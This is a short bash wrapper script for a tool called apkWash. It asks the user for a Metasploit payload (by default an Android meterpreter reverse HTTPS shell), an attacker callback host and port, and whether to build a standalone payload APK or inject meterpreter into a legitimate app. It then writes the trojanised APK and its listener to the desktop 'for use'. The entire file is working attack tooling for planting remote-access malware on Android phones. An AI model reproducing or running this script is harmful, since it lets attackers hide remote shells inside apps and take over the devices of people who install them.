#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
RED='\033[0;31m'
LBBLUE='\e[104m'
DLOAD='android/meterpreter/reverse_https'

cd tools/apkwash
echo -e "${RED}"
figlet -f mini apkWash
echo -e "${NC}"

echo -e "${W}Default payload is ${DLOAD}, press enter to use this payload or please enter alternative option now${NC}"
read ALOAD 
# Payload Opts
if [[ ${DLOAD} == ${ALOAD} ]]; then
    LOAD="${DLOAD}"
else
    LOAD="${ALOAD}"
fi
echo -e "${W}Would you like to create a ${YLW}p${W}ayload or inject meterpreter into ${YLW}l${W}egitimate apk? (${YLW}p${W}/${YLW}l${W})"
read CLOAD

# CallBack Opts
echo -e "${W}Please enter your LHost${NC}"
read LH 
echo -e "${W}Please enter your LPort${NC}"
read LP
# Create or Inject Apk
if [[ ${CLOAD} == 'p' ]]; then
    echo -e "${W}Please enter the name of your OutFile${NC}"
    read OUTP
    sudo ./apkwash.sh -p ${LOAD} LHOST=${LH} LPORT=${LP} -n -v -o ${OUTP}
    sudo chmod 777 ${OUTP}.apk ${OUTP}.listener
    mv ${OUTP}.* -t ~/Desktop
    echo -e "${RED}Payload files (apk & listener) have been moved to your desktop for use${NC}"
else
    echo -e "${W}Please enter the full path to legitimate apk${NC}"
    read LAPK
    sudo ./apkwash.sh -p ${LOAD} LHOST=${LH} LPORT=${LP} -n -v -x ${LAPK}
    sudo chmod 777 *.apk *.listener
    mv *.apk *.listener -t ~/Desktop
    echo -e "${RED}Payload files (apk & listener) have been moved to your desktop for use${NC}"
fi



